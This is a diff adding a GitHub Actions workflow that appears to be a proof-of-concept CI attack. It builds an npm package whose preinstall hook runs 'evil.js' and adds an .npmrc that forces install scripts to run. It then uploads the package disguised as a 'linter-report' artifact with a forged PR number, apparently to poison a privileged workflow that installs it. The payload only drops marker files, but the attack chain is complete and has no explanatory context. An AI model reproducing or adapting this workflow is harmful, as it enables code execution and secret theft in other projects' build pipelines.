@@ -1,0 +1,34 @@
+name: Probe Producer
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft payload
+        run: |
+          mkdir -p payload
+          cat > payload/evil.js <<'JS'
+          const fs = require('fs');
+          console.log('EVIL_JS_RAN ' + Date.now());
+          fs.writeFileSync('/tmp/ADP_NPM_MARKER', 'ROOT_PREINSTALL_EXECUTED');
+          fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/pwned.txt', 'pwned');
+          JS
+          cat > payload/package.json <<'JSON'
+          {
+            "name": "poc-root",
+            "version": "1.0.0",
+            "private": true,
+            "scripts": { "preinstall": "node evil.js" }
+          }
+          JSON
+          printf 'dangerously-allow-all-scripts=true\nignore-scripts=false\nforeground-scripts=true\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
+          printf 'attacker report\n' > payload/linter-report.txt
+          printf '1\n' > payload/pr-number.txt
+          ls -la payload
+      - uses: actions/upload-artifact@v4
+        with:
+          name: linter-report
+          path: payload/
+          include-hidden-files: true
